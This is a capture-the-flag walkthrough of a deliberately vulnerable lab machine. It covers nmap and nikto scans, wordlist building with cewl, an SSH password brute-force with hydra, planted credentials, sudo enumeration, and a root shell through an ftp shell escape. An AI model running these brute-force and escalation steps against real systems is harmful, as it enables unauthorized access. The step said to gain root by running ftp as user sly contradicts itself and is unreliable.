## Target Information
- **IP Address**: 10.0.2.4

## Information Gathering

### Open Ports
An initial scan of the target was conducted using Nmap to identify open ports.

```
$ nmap -p- 10.0.2.4
```

**Nmap Output:**
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-12 20:51 GMT
Nmap scan report for 10.0.2.4
Host is up (0.0060s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT      STATE SERVICE
80/tcp    open  http
60022/tcp open  unknown 
```

A more detailed service version scan was performed on the identified open ports:

```
$ nmap -sV 10.0.2.4 -p 80,60022
```

**Nmap Output:**
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-12 20:55 GMT
Nmap scan report for 10.0.2.4
Host is up (0.0016s latency).

PORT      STATE SERVICE VERSION
80/tcp    open  http    nginx 1.14.0 (Ubuntu)
60022/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Vulnerability Scanning
A vulnerability scan was conducted using Nikto to identify potential security issues on the web server.

```
$ nikto -url 10.0.2.4
```

**Nikto Output:**
```
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.0.2.4
+ Target Hostname:    10.0.2.4
+ Target Port:        80
+ Start Time:         2024-11-12 20:56:41 (GMT0)
---------------------------------------------------------------------------
+ Server: nginx/1.14.0 (Ubuntu)
+ /: The anti-clickjacking X-Frame-Options header is not present.
+ /: The X-Content-Type-Options header is not set.
+ /robots.txt: Entry '/johnnyrambo/' is returned a non-forbidden or redirect HTTP code (200).
+ /robots.txt: contains 1 entry which should be manually viewed.
+ nginx/1.14.0 appears to be outdated (current is at least 1.20.1).
+ /#wp-config.php#: #wp-config.php# file found. This file contains the credentials.
+ 8103 requests: 0 error(s) and 6 item(s) reported on remote host
+ End Time:           2024-11-12 20:57:25 (GMT0) (44 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

## Exploitation

Upon accessing the web server at port 80, the homepage prompted the user to review the source code for further instructions. The source code contained HTML comments directing the user to visit the "IP/rambo.html" page.

The `rambo.html` page suggested running Nmap and Nikto scans. The Nikto scan revealed that the `robots.txt` file was accessible, which contained a reference to a new directory: `/johnnyrambo`.

The `robots.txt` file also suggested using the following command to scrape a wordlist:

```
cewl -w words.txt -d 1 -m 5 http://10.0.2.4/johnnyrambo/
```

Next, I navigated to `/johnnyrambo/ssh.html` for further steps. To brute-force the SSH password for the user `johnny`, I used Hydra:

```
$ hydra -l johnny -P words.txt -v 10.0.2.4 ssh -s 60022 -t 4
```

**Hydra Output:**
```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak
...
[60022][ssh] host: 10.0.2.4   login: johnny   password: Vietnam
```

The password for the user `johnny` was successfully found to be `Vietnam`. I accessed the SSH service using the following command:

```
$ ssh johnny@10.0.2.4 -p 60022
```

### Post-Exploitation

Once logged in as `johnny`, I accessed the `README.txt` file, which contained the following message:

```
Nice job! You're cruising along nicely!

When we find ourselves on a web server, we want to check out the web directory.

In case you haven't figured it out, this server is running Nginx. For this particular setup, I've left things at the default. If we look in the configuration file, we can view the location of the web directory:

cat /etc/nginx/sites-enabled/default

That's kind of noisy in the output. We can clean it up with the following:

cat /etc/nginx/sites-enabled/default | grep -v "#"

-v is an invert match and will essentially remove all of the comment (#) lines.

When we clean it up, the line starting with "root" points to the web directory.

Move into the web directory and see if there are any files to read...
```

Following the instructions, I executed the command to view the Nginx configuration:

```
johnny@firstblood:~$ cat /etc/nginx/sites-enabled/default | grep -v '#'
```

**Output:**
```
server {
	listen 80 default_server;
	listen [::]:80 default_server;

	root /var/www/html;

	index index.html index.htm index.nginx-debian.html;

	server_name _;

	location / {
		try_files $uri $uri/ =404;
	}
}
```

The output indicated that the web root directory was located at `/var/www/html`. I navigated to this directory to check for any files:

```
johnny@firstblood:/var/www/html$ ls
README.txt
```

I found another `README.txt` file, which contained the following message:

```
Hack the Planet!

Nice work!

I've hidden a file on this server which is readable by you. Seems like a needle in the haystack, no?

We can use the "find" command to find files. If I wanted to find the /etc/passwd file:

find /etc -name passwd -print

^^ would generate some permission denied errors along with the correct response.

We can redirect errors:

find /etc -name passwd -print 2>/dev/null

That last part: 2>/dev/null

^^ will redirect errors to the same place where unicorn crap ends up. It's magic. Don't question me.

If we run the following:

find / -type f -readable 2>/dev/null

We are going to get a LOT of noise.

However, if we fine-tune this a bit:

find / -type f -readable 2>/dev/null | grep README.txt

-type f stands for type file
-readable stands for readable by this current user
| grep README.txt is a way to redirect the output to grep for a string match, the string being README.txt

We can narrow down the list. Find the file, read the contents.
```

I executed the suggested command to locate the `README.txt` file:

```
johnny@firstblood:/var/www/html$ find / -type f -readable 2>/dev/null | grep README.txt
```

**Output:**
```
/opt/README.txt
```

I then accessed the contents of `/opt/README.txt`:

```
johnny@firstblood:/var/www/html$ cat /opt/README.txt
```

**Contents:**
```
There's another user on this server that might have greater privileges:

username:  blood
password:  HackThePlanet2020!!

You can either switch users or ssh as the new user. If you know how to do both, pick one. If you only know how to SSH, learn to switch users.
```

With the credentials for the user `blood`, I decided to switch users:

```
johnny@firstblood:/var/www/html$ su - blood
Password: 
```

Upon successful login, I accessed the `README.txt` file for the user `blood`:

```
blood@firstblood:~$ cat README.txt
```

**Contents:**
```
I didn't think you needed to be told about the README.txt file.

I'm really stoked that you're cruising along. Nice work!

If you move into the /home directory, we can see the home directories for the other users on this server. There's a user directory with some text files. Attempt to read both files.
```

I navigated to the `/home` directory to explore the user directories:

```
blood@firstblood:~$ cd /home
blood@firstblood:/home$ ls
blood  firstblood  johnny  sly
```

I checked the contents of the `blood` directory:

```
blood@firstblood:/home$ ls blood/
README.txt
```

Next, I attempted to access the `firstblood` directory, but encountered a permission denied error:

```
blood@firstblood:/home$ ls firstblood/
ls: cannot open directory 'firstblood/': Permission denied
```

I then checked the `sly` directory, which contained two files:

```
blood@firstblood:/home$ ls sly/
README_FIRST.txt  README.txt
```

I attempted to read the `README.txt` file, but received an error indicating that the file does not exist:

```
blood@firstblood:/home/sly$ cat README
cat: README: No such file or directory
```

I then read the contents of `README_FIRST.txt`:

```
blood@firstblood:/home/sly$ cat README_FIRST.txt
```

**Contents:**
```
Obviously, you're able to read this file but you're unable to read the other because you don't have permissions. If you perform an: ls -al

You can see that only the user sly has permission to read README.txt.

Hold that thought for a moment...

In some instances we need to perform tasks as other users or even root sometimes. We can see if we have those permissions by typing:

sudo -l

-l stands for list, as in -- list our permissions  

We discover that we have the ability to run a command as sly that might help us.

Figure out how to execute that command as the user sly.
```

I executed the command to list my sudo privileges:

```
blood@firstblood:/home/sly$ sudo -l
```

The output indicated that I could run commands as the user `sly`. I then used the following command to read the `README.txt` file in `sly`'s home directory:

```
blood@firstblood:/home/sly$ sudo -u sly cat /home/sly/README.txt
[sudo] password for blood: 
```

**Contents of `README.txt`:**
```
In case I forget, my password is: SylvesterStalone

PS -- I think root gave us sudo privileges. I think this might be dangerous though because I found a website: https://gtfobins.github.io/

It shows a possible privilege escalation for root. I'm totally going to check out root's files. hint hint
```

With the password for `sly` in hand, I decided to escalate privileges to root. I executed the following command to run FTP as the user `sly`:

```
sly@firstblood:~$ sudo -u sly /usr/bin/ftp
[sudo] password for sly: 
```

Once in the FTP shell, I executed a shell command to gain root access:

```
ftp> !/bin/sh
# whoami
root
```

I confirmed that I had root privileges:

```
# whoami
root
```

I then navigated through the file system to explore the contents of the root directory:

```
# cd ../
# ls
bin    dev   initrd.img      lib64	 mnt   root  srv       tmp  vmlinuz
boot   etc   initrd.img.old  lost+found  opt   run   swapfile  usr
cdrom  home  lib	     media	 proc  sbin  sys       var
```

I accessed the root's home directory:

```
# cd root
# ls
README.txt
```

Finally, I read the contents of the `README.txt` file located in the root directory:

```
# cat README.txt
```

**Contents:**
```
______ _          _  ______ _                 _ 
|  ___(_)        | | | ___ \ |               | |
| |_   _ _ __ ___| |_| |_/ / | ___   ___   __| |
|  _| | | '__/ __| __| ___ \ |/ _ \ / _ \ / _` |
| |   | | |  \__ \ |_| |_/ / | (_) | (_) | (_| |
\_|   |_|_|  |___/\__\____/|\___/ \___/ \__,_|
                                                
                                                
____    ______            _           _     ____
\ \ \   | ___ \          | |         | |   / / /
 \ \ \  | |_/ /___   ___ | |_ ___  __| |  / / / 
  > > > |    // _ \ / _ \| __/ _ \/ _` | < < <  
 / / /  | |\ \ (_) | (_) | ||  __/ (_| |  \ \ \ 
/_/_/   \_| \_\___/ \___/ \__\___|\__,_|   \_\_\
                                                

I hope you enjoyed this box. I wanted to create something on the easier side because I know how frustrating and rewarding the process can be. If you liked this box please reach out to me on Twitter and let me know:

@iamv1nc
```